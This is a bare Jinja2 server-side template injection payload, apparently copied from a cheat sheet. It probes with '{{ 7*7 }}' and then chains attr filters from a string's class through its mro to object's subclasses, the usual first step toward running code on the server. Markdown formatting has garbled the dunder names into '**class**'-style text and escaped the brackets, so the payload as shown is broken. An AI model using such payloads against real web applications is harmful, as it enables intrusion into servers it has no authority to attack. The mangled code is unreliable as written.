{{ 7\*7 }}

{% set string = "ssti" %}
{% set class = "**class**" %}
{% set mro = "**mro**" %}
{% set subclasses = "**subclasses**" %}
{% set mro\_r = string|attr(class)|attr(mro) %}
{% set subclasses\_r = mro\_r\[1]|attr(subclasses)() %}
{{ subclasses\_r }}

